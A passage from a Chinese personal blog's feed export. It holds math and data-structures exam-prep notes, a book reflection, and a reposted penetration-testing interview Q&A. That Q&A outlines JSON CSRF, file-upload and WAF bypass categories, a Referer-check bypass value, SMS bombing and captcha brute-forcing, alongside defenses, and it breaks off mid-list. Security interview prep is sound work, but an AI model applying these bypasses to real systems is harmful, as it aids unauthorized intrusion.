class="headerlink" title="1.3.1.3.    先代后求"></a>1.3.1.3.    先代后求</h4><h5 id="1-3-1-3-1-￼"><a href="#1-3-1-3-1-￼" class="headerlink" title="1.3.1.3.1.    ￼  "></a>1.3.1.3.1.    ￼  <img src="https://ckcah.github.io/images/math/5.01/image_1627957888_17.png" alt="img"></h5><h4 id="1-3-1-4-给出函数在某点连续，且给出一个关于函数的极限为常数的式子，判断函数的极值"><a href="#1-3-1-4-给出函数在某点连续，且给出一个关于函数的极限为常数的式子，判断函数的极值" class="headerlink" title="1.3.1.4.    给出函数在某点连续，且给出一个关于函数的极限为常数的式子，判断函数的极值"></a>1.3.1.4.    给出函数在某点连续，且给出一个关于函数的极限为常数的式子，判断函数的极值</h4><h5 id="1-3-1-4-1-保号性"><a href="#1-3-1-4-1-保号性" class="headerlink" title="1.3.1.4.1.    保号性"></a>1.3.1.4.1.    保号性</h5><h5 id="1-3-1-4-2-极限与无穷小"><a href="#1-3-1-4-2-极限与无穷小" class="headerlink" title="1.3.1.4.2.    极限与无穷小"></a>1.3.1.4.2.    极限与无穷小</h5><h3 id="1-3-2-求最大最小值"><a href="#1-3-2-求最大最小值" class="headerlink" title="1.3.2.    求最大最小值"></a>1.3.2.    求最大最小值</h3><h4 id="1-3-2-1-一个函数在另一个函数上的最值"><a href="#1-3-2-1-一个函数在另一个函数上的最值" class="headerlink" title="1.3.2.1.    一个函数在另一个函数上的最值"></a>1.3.2.1.    一个函数在另一个函数上的最值</h4><h5 id="1-3-2-1-1-直接求一阶偏导找驻点"><a href="#1-3-2-1-1-直接求一阶偏导找驻点" class="headerlink" title="1.3.2.1.1.    直接求一阶偏导找驻点"></a>1.3.2.1.1.    直接求一阶偏导找驻点</h5><h6 id="1-3-2-1-1-1-注意：当题目问所围成区域上的最值点时，边界不取"><a href="#1-3-2-1-1-1-注意：当题目问所围成区域上的最值点时，边界不取" class="headerlink" title="1.3.2.1.1.1.    注意：当题目问所围成区域上的最值点时，边界不取"></a>1.3.2.1.1.1.    注意：当题目问所围成区域上的最值点时，边界不取</h6><p>1.3.2.1.1.1.1. 如：x=0,y=0</p>
<h5 id="1-3-2-1-2-条件最值（带有一个未知常数）"><a href="#1-3-2-1-2-条件最值（带有一个未知常数）" class="headerlink" title="1.3.2.1.2.    条件最值（带有一个未知常数）"></a>1.3.2.1.2.    条件最值（带有一个未知常数）</h5><h5 id="1-3-2-1-3-构造拉格朗日函数"><a href="#1-3-2-1-3-构造拉格朗日函数" class="headerlink" title="1.3.2.1.3.    构造拉格朗日函数"></a>1.3.2.1.3.    构造拉格朗日函数</h5><h5 id="1-3-2-1-4-写成参数方程"><a href="#1-3-2-1-4-写成参数方程" class="headerlink" title="1.3.2.1.4.    写成参数方程"></a>1.3.2.1.4.    写成参数方程</h5><h5 id="1-3-2-1-5-当用一阶偏导求出的驻点不在函数区域范围内时，-可看成是函数离该点的距离（当函数具有对称性时），"><a href="#1-3-2-1-5-当用一阶偏导求出的驻点不在函数区域范围内时，-可看成是函数离该点的距离（当函数具有对称性时），" class="headerlink" title="1.3.2.1.5.    当用一阶偏导求出的驻点不在函数区域范围内时， 可看成是函数离该点的距离（当函数具有对称性时），"></a>1.3.2.1.5.    当用一阶偏导求出的驻点不在函数区域范围内时， 可看成是函数离该点的距离（当函数具有对称性时），</h5><h5 id="1-3-2-1-6-典例-￼"><a href="#1-3-2-1-6-典例-￼" class="headerlink" title="1.3.2.1.6.    典例 ￼  "></a>1.3.2.1.6.    典例 ￼  <img src="https://ckcah.github.io/images/math/5.01/image_1627959413_18.png" alt="img"></h5><h6 id="1-3-2-1-6-1-拉格朗日法"><a href="#1-3-2-1-6-1-拉格朗日法" class="headerlink" title="1.3.2.1.6.1.    拉格朗日法"></a>1.3.2.1.6.1.    拉格朗日法</h6><p>1.3.2.1.6.1.1. ￼<img src="https://ckcah.github.io/images/math/5.01/image_1627959482_19.png" alt="img"></p>
<h6 id="1-3-2-1-6-2-参数方程法"><a href="#1-3-2-1-6-2-参数方程法" class="headerlink" title="1.3.2.1.6.2.    参数方程法"></a>1.3.2.1.6.2.    参数方程法</h6><p>1.3.2.1.6.2.1. ￼<img src="https://ckcah.github.io/images/math/5.01/image_1627959503_20.png" alt="img"></p>
<h6 id="1-3-2-1-6-3-看做函数到该点距离的方法"><a href="#1-3-2-1-6-3-看做函数到该点距离的方法" class="headerlink" title="1.3.2.1.6.3.    看做函数到该点距离的方法"></a>1.3.2.1.6.3.    看做函数到该点距离的方法</h6><p>1.3.2.1.6.3.1. ￼<img src="https://ckcah.github.io/images/math/5.01/image_1627959519_21.png" alt="img"></p>
<h5 id="1-3-2-1-7-综合性考题"><a href="#1-3-2-1-7-综合性考题" class="headerlink" title="1.3.2.1.7.    综合性考题"></a>1.3.2.1.7.    综合性考题</h5><h6 id="1-3-2-1-7-1-￼"><a href="#1-3-2-1-7-1-￼" class="headerlink" title="1.3.2.1.7.1.    ￼ "></a>1.3.2.1.7.1.    ￼ <img src="https://ckcah.github.io/images/math/5.01/image_1627959997_22.png" alt="img"></h6><p>1.3.2.1.7.1.1. ￼<img src="https://ckcah.github.io/images/math/5.01/image_1627960034_23.png" alt="img"></p>
<p><img src="file:///C:/Users/C/AppData/Local/Temp/mindmaster/c301e3e048/001/_CopyPix_1627956985_12.png" alt="img"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>数学</category>
        <category>解题思路篇</category>
        <category>高数</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>多元函数微分学解题思路（思维导图）篇</title>
    <url>/2021/08/03/%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%88%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%EF%BC%89%E7%AF%87/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/math/5.01/image-20210803121932793.png" alt="image-20210803121932793"></p>
<p><em><strong>更新：严选题汇总</strong></em></p>
<p><img src="https://ckcah.github.io/images/math/5.01/image-20210806075526831.png" alt="image-20210806075526831"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>数学</category>
        <category>思维导图</category>
        <category>解题思路篇</category>
        <category>高数</category>
        <category>数学</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>多元积分学及其应用-定义篇</title>
    <url>/2021/08/22/%E5%A4%9A%E5%85%83%E7%A7%AF%E5%88%86%E5%AD%A6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8-%E5%AE%9A%E4%B9%89%E7%AF%87/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/math/9/image-20210822084211501.png" alt="image-20210822084211501"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>数学</category>
        <category>定义篇</category>
        <category>高数</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>多元积分学及其应用-解题篇</title>
    <url>/2021/08/24/%E5%A4%9A%E5%85%83%E7%A7%AF%E5%88%86%E5%AD%A6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8-%E8%A7%A3%E9%A2%98%E7%AF%87/</url>
    <content><![CDATA[<p><a href="https://ckcah.github.io/images/math/9/image-20210824101252647.png">image-20210824101252647</a></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>数学</category>
        <category>定义篇</category>
        <category>高数</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构自我探索1</title>
    <url>/2021/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%87%AA%E6%88%91%E6%8E%A2%E7%B4%A21/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/DS/answer1.png" alt="image-20210801161555987"></p>
<p><strong>答案</strong>：A      D</p>
<p><em>第一空：</em></p>
<p>因为有12个关键字，</p>
<p>所以构成了高度为4的二叉树</p>
<span id="more"></span>

<p>前3层关键字总数为7，第4层有5个关键字</p>
<p>则，前3层，查找总长度 =第一层个数 * 第一层查找长度（1） + 第二层个数 * 第二层查找长度（2）+ 第三层个数（4）  * 第三层查找长度（3） = 1 + 4 + 12 = 17</p>
<p>第四层，查找总长度 = 第四层查找长度（4） * 第五层个数（5） = 20</p>
<p>总个数为 12个，所以查找成功的平均查找长度 = （17 + 20） /  12</p>
<p><em>第二空：</em></p>
<p>其实是找二叉树中叶子结点需要找的次数</p>
<p>根据上边第一问推论的二叉树的样子，可以看出</p>
<p>第4层有3个叶子结点</p>
<p>第5层有 5 * 2 个叶子结点</p>
<p>共13个叶子结点</p>
<p>第四层查找失败的总长度 = 叶子结点个数（3） * 证明它不存在需要经过的关键字（3）  = 9</p>
<p>第五层查找失败的总长度 =  叶子结点个数（10） * 证明它不存在需要经过的关键字（4） = 40</p>
<p>所以最后得出查找失败的平均查找长度 = （9 + 40） / 13</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>408</category>
        <category>小领悟</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>无穷级数+二重积分定义篇</title>
    <url>/2021/08/13/%E6%97%A0%E7%A9%B7%E7%BA%A7%E6%95%B0-%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E5%AE%9A%E4%B9%89%E7%AF%87/</url>
    <content><![CDATA[<h1 id="二重积分"><a href="#二重积分" class="headerlink" title="二重积分"></a>二重积分</h1><h2 id="易忘点"><a href="#易忘点" class="headerlink" title="易忘点"></a>易忘点</h2><p><img src="https://ckcah.github.io/images/math/6/image-20210807114234230.png" alt="image-20210807114234230"></p>
<h2 id="对称性"><a href="#对称性" class="headerlink" title="对称性"></a>对称性</h2><p><img src="https://ckcah.github.io/images/math/6/image-20210807114204814.png" alt="image-20210807114204814"></p>
<h1 id="无穷级数"><a href="#无穷级数" class="headerlink" title="无穷级数"></a>无穷级数</h1><h2 id="常数项级数"><a href="#常数项级数" class="headerlink" title="常数项级数"></a>常数项级数</h2><p>级数收敛与发散与前有限项无关</p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813093102844.png" alt="image-20210813093102844"></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813093155576.png" alt="image-20210813093155576"></p>
<p><strong>前提：</strong><img src="https://ckcah.github.io/images/math/6-7/image-20210813093320064.png" alt="image-20210813093320064"></p>
<p><strong>基础原理：</strong><img src="https://ckcah.github.io/images/math/6-7/image-20210813093357134.png" alt="image-20210813093357134"></p>
<h3 id="级数的审敛"><a href="#级数的审敛" class="headerlink" title="级数的审敛"></a>级数的审敛</h3><p>1.比较判别法</p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813093637455.png" alt="image-20210813093637455"></p>
<p>2.比较法极限形式（把Vn乘到右边更好看）</p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813093701499.png" alt="image-20210813093701499"></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813093810738.png" alt="image-20210813093810738"></p>
<p>3.比值法</p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813093830890.png" alt="image-20210813093830890"></p>
<p>4.根值法</p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813093848032.png" alt="image-20210813093848032"></p>
<p>5.积分判别法</p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813093905880.png" alt="image-20210813093905880"></p>
<table>
<thead>
<tr>
<th></th>
<th>优</th>
<th>缺</th>
<th>遇到的情况</th>
</tr>
</thead>
<tbody><tr>
<td>1、2</td>
<td>适用范围广</td>
<td>不方便</td>
<td>n^p        ln(n)</td>
</tr>
<tr>
<td>3、4</td>
<td>方便</td>
<td>适用范围小</td>
<td>a^n      n!       n^n<br>一般a^n和n^n用根植法<br>n!用比值法<br></td>
</tr>
</tbody></table>
<p>交错级数</p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813094518245.png" alt="image-20210813094518245"></p>
<h3 id="条件收敛与绝对收敛"><a href="#条件收敛与绝对收敛" class="headerlink" title="条件收敛与绝对收敛"></a>条件收敛与绝对收敛</h3><p><img src="https://ckcah.github.io/images/math/6-7/image-20210813094745786.png" alt="image-20210813094745786"></p>
<h2 id="幂级数"><a href="#幂级数" class="headerlink" title="幂级数"></a>幂级数</h2><p>基本形式：</p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813094916467.png" alt="image-20210813094916467"></p>
<p>或<img src="https://ckcah.github.io/images/math/6-7/image-20210813094929251.png" alt="image-20210813094929251"></p>
<p>阿贝尔定理（注意绝对值）：</p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813095105609.png" alt="image-20210813095105609"></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813100049727.png" alt="image-20210813100049727"></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813100103344.png" alt="image-20210813100103344"></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813100306336.png" alt="image-20210813100306336"></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813101110138.png" alt="image-20210813101110138"></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813101219302.png" alt="image-20210813101219302"></p>
<p><strong>泰勒级数：</strong></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813101307712.png" alt="image-20210813101307712"></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813101428405.png" alt="image-20210813101428405"></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813101449835.png" alt="image-20210813101449835"></p>
<h3 id="函数展开为幂级数的方法"><a href="#函数展开为幂级数的方法" class="headerlink" title="函数展开为幂级数的方法"></a>函数展开为幂级数的方法</h3><p>1.直接展开法</p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813101557690.png" alt="image-20210813101557690"></p>
<p><strong>2.间接展开法（重）</strong></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813101626613.png" alt="image-20210813101626613"></p>
<h2 id="傅里叶级数"><a href="#傅里叶级数" class="headerlink" title="傅里叶级数"></a>傅里叶级数</h2><p><img src="https://ckcah.github.io/images/math/6-7/image-20210813101755960.png" alt="image-20210813101755960"></p>
<p>2.收敛定理（狄利克雷）</p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813101852118.png" alt="image-20210813101852118"></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813101937706.png" alt="image-20210813101937706"></p>
<p>奇偶延拓</p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813102018629.png" alt="image-20210813102018629"></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813102045596.png" alt="image-20210813102045596"></p>
<p><img src="https://ckcah.github.io/images/math/6-7/image-20210813102100714.png" alt="image-20210813102100714"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>数学</category>
        <category>定义篇</category>
        <category>高数</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>无穷级数解题思路篇</title>
    <url>/2021/08/14/%E6%97%A0%E7%A9%B7%E7%BA%A7%E6%95%B0%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%E7%AF%87/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/math/6-7/image-20210815090522517.png" alt="image-20210815090522517"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>数学</category>
        <category>思维导图</category>
        <category>解题思路篇</category>
        <category>高数</category>
        <category>数学</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>月亮与六便士第一遍观后感</title>
    <url>/2020/09/04/%E6%9C%88%E4%BA%AE%E4%B8%8E%E5%85%AD%E4%BE%BF%E5%A3%AB%E7%AC%AC%E4%B8%80%E9%81%8D%E8%A7%82%E5%90%8E%E6%84%9F/</url>
    <content><![CDATA[<p>在机场的时候去早了很无聊，然后就找了个书店，买的其中一本书《月亮与六便士》</p>
<p>这本书很短，至少翻译出来很短，而且，原文是法文，所以翻译出来可能有些许翻译者自带的情绪和理解。我读的版本是苏福忠译。说来惭愧，英语太烂，不能全文通读。希望第二遍有这个机会写一篇英文观后感。</p>
<p>这本书，倒也不是给我很深的感觉，大概，在我的理解范围之内，也在我的理解范围之外。查尔斯的性格、德克的包容、“我”的交往方式、还有德克妻子的举动、查尔斯最后一任妻子的执着，都是我不理解的，但也是我能理解。</p>
<p>我其实很能理解查尔斯的背弃家庭追求向往已久的画家生活，哪怕是那么穷困潦倒不切实际，但是，至少，他有那个勇气，他的心灵和灵魂，是超乎常理的，他根本不把生死看在眼里，也不会在意周围的环境，他只是在追求自己想要的东西，甚至到了最后，得了该死的疾病，也还是不舍弃的在画画。我是没有那个勇气的，但和他相同的，我也有自己想要搞清楚的事情，只是一直表达不出来。在内心深处，我也想要不顾及所有人的一切来找寻某个东西。我能理解他的无情。我是一个常人，光是从考虑其他人的感受来说，我和德克一样，有一个多管闲事的“圣母心”，无法摆脱。我在读书的时候，会试着去进入某一个角色感受某一件事情，于是，我进入状态感受了德克在被妻子抛弃，被自己认为是天才的人无视的感觉，如果是我，我会很愤怒也很绝望，甚至会和德克一样一次又一次的去找妻子，会很憎恨查尔斯，会不再和他来往。但最后德克在离开法国准备回家的时候，却邀请查尔斯的时候，我，是不能理解的，我也不知道，自己会不会原谅他，就算是出于对天才的怜惜，我想我也会犹豫很久。</p>
<p>从外人的角度来看查尔斯，我很讨厌很讨厌他。但如果将自己代入查尔斯，却又是一件很舒服的事情，各个方面。我无法描述太多，那是一种特别的感觉，让我贪婪的觉得，如果我也如此该多好。可惜我不是天才，我得不到德克的追捧，也没有他第三任妻子的忠诚，更不能摆脱家庭。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>扩展读物</category>
        <category>观后感</category>
      </categories>
      <tags>
        <tag>喜欢</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透驻场面试经验分享</title>
    <url>/2020/05/09/%E6%B8%97%E9%80%8F%E9%A9%BB%E5%9C%BA%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<p><strong>keyword：我只是互联网的搬运工</strong></p>
<p><strong>转载于：<a href="https://mp.weixin.qq.com/s/EkDEwnmQIlrnWUqi-e6I9Q">https://mp.weixin.qq.com/s/EkDEwnmQIlrnWUqi-e6I9Q</a></strong></p>
<p>最近接到一个渗透测试驻场项目。几位同事去面试了下，下面对面试的问题进行一个汇总。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.json的csrf的利用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.小程序的渗透和普通渗透的差异</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.app本身的漏洞测试 四大组件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4.业务上线前，怎么测试，从哪些角度测试</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5.java应用上传漏洞利用,如何绕过</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6.应用有漏洞，但是无法修复和停用，你怎么办</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7.cookie你会测试什么内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8.用户登录你会测试哪些内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9.你审计java代码挖到的漏洞，怎么挖的，怎么修复的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">10.如果开发通过加referer的方式修复csrf，怎么判断这个referer是不是有效</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">11.json格式的数据包可以测哪些漏洞</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">12.如果网站评论区的复选框存在xss，怎么修复</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">13.绕过验证码有哪些思路</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">14.除了各种服务的未授权，网站的未授权怎么测</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">15.关于会话你会测哪些内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">16.文件上传</span><br></pre></td></tr></table></figure>

<span id="more"></span> 



<p><strong>01 json的csrf的利用和防御</strong></p>
<p>攻击：</p>
<p>1）服务器只接受</p>
<p>Content-Type: application/json的包文</p>
<p>2）POSTbody需要以JSON格式发送,可以使用XHR、fetch来实现csrf</p>
<p>防御：</p>
<p>1）用户操作验证，在提交数据时需要输入验证码</p>
<p>2）请求来源验证，验证请求来源的referer</p>
<p>3）表单token验证（令牌）</p>
<p><strong>02 小程序的渗透和普通渗透的差异</strong></p>
<p>1）微信小程序的包储存在本地的，只要是访问过微信小程序，他的包自动下载到本地</p>
<p>把wxapkg包下载到了本地，然后下载个解包工具，就可以得到小程序前端的代码</p>
<p>2）Proxifier代理客户端 安卓模拟器全局代理</p>
<p>3）常见支付宝和微信中</p>
<p>ios:推荐抓包工具Stream、网络三件套</p>
<p>安卓:推荐抓包工具package capture</p>
<p>4）小程序未进行https证书强校验，所以用安卓手机配合burp即可进行抓包。</p>
<p>如果小程序开启了https证书强校验，那我们就需要hook微信或者反编译小程序后替换证书</p>
<p>5）微信pc端测试版</p>
<p><a href="https://dldir1.qq.com/weixin/Windows/Beta/WeChat2.9.0_Beta.exe">https://dldir1.qq.com/weixin/Windows/Beta/WeChat2.9.0_Beta.exe</a></p>
<p>6）在线扫描</p>
<p><a href="https://wetest.qq.com/console/miniapp/scan">https://wetest.qq.com/console/miniapp/scan</a></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/ZWDfQrMFWoKicgNPCiaBE2tHJmDD4T57jKn0BAkwB9RawcGtxf1EL7O1SL4Ls0AoFF9IL847wFavD4G3CdrwBY7Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p>
<p><strong>03 app本身的漏洞测试 四大组件</strong></p>
<p>1）APP面临的主要风险可以分为客户端风险和服务端风险。</p>
<p>  a. 客户端风险</p>
<p>  传统逆向分析类（反编译、调试、四大组件漏洞、加密/签名破解…）</p>
<p>  用户已经中招类（输入记录、导出组件、进程注入…）。</p>
<p>  b. 服务端风险</p>
<p>  系统组件类（MS12-020、ShellShock、心血、ST2…）</p>
<p>  业务应用类（注入跨站越权执行上传下载弱口令…）。</p>
<p>2）安卓系统的四大组件：</p>
<p>  Activity：呈现可供用户交互的界面，是最常见的组件；</p>
<p>  Service：长时间执行后台作业，常见于监控类应用；</p>
<p>  ContentProvider：在多个APP间共享数据，比如通讯录；</p>
<p>  BroadcastReceiver：注册特定事件，并在其发生时被激活</p>
<p>组件测试工具-drozer</p>
<p><strong>04 业务上线前，怎么测试，从哪些角度测试</strong></p>
<p>   在测试环境下,根据测试类型（web、APP、小程序、公众号）进行测试</p>
<p>按功能点进行测试。</p>
<p>1)黑盒:按照功能点的划分进行测试,OWASP TOP 10,checklist</p>
<p>2)白盒:代码审计</p>
<p>3)灰盒</p>
<p><strong>05 java应用上传漏洞利用,如何绕过</strong></p>
<p>1）客户端绕过</p>
<p>2）服务端绕过</p>
<p>  a. 文件类型绕过</p>
<p>  b. 文件头绕过</p>
<p>  c. 文件后缀名绕过</p>
<p>3）配合文件包含漏洞</p>
<p>4）配合服务器解析漏洞</p>
<p>5）配合操作系统文件命令规则</p>
<p>6）CMS、编辑器漏洞</p>
<p>7）配合其他规则</p>
<p>8）WAF绕过</p>
<p>  a. 垃圾数据</p>
<p>  b. filename</p>
<p>  c. POST/GET</p>
<p>  d. 利用waf本身缺陷</p>
<p><strong>06 应用有漏洞，</strong></p>
<p><strong>但是无法修复和停用，****你怎么办</strong></p>
<p>1）上安全设备，如waf</p>
<p>2） ACL</p>
<p>3）临时性补丁</p>
<p>4）加认证</p>
<p>5）二次封装</p>
<p><strong>07 cookie你会测试什么内容</strong></p>
<p>1）字段分析, 递减到剩下关键的鉴别字段</p>
<p>2）算法分析, JWT等等</p>
<p>3） 注入类测试，sql注入</p>
<p>4） xss</p>
<p>5） 反序列化</p>
<p><strong>08 用户登录你会测试哪些内容</strong></p>
<p>1）明确登陆涉及的接口,顺序和关系</p>
<p>2）针对顺序可能涉及, 多重认证绕过bypass</p>
<p>3）针对接口,可以涉及注入类,url跳转,用户名枚举,验证码失效问题, 弱口令</p>
<p>  a. 注入也可以二次注入 （万能密码）</p>
<p>  b.xss</p>
<p>  c.  短信炸弹</p>
<p>  d.验证码爆破</p>
<p>  e.验证邮箱或短信绕过</p>
<p>  f.找回密码处跳过验证 等等</p>
<p><strong>09 你审计java代码挖到的漏洞，</strong></p>
<p><strong>怎么挖，怎么修复</strong></p>
<p>  Java代码审计可以发现的漏洞分为两类：</p>
<p>1） 程序员由于编码不当产生的漏洞，典型包括后门、SQL注入、文件上传、任意文件下载、接口非授权访问、垂直越权。对于水平越权、XSS、CSRF、逻辑类漏洞也可以检测；</p>
<p>2）第三方组件使用不当产生的漏洞，从POM文件中可以找到使用了低版本的组件。从应用配置文件中可以找到配置不当问题。</p>
<p>Fortify SCA扫描</p>
<p><strong>10 如果开发通过加referer的方式修复csrf，</strong></p>
<p><strong>怎么判断referer是不是有效</strong></p>
<p>  总而言之, 先明确这个接口从referer取出了什么值, 那么对这个值有怎样的校验逻辑：</p>
<p>1）利用ftp://,http://,https://,file://,javascript:,data</p>
<p>2）判断Referer是某域情况下绕过 referer: </p>
<p><a href="http://www.xxx.com@www.baidu.com/">www.xxx.com@www.baidu.com</a></p>
<p>3）判断Referer是否存在某关键词</p>
<p>4）判断referer是否有某域名</p>
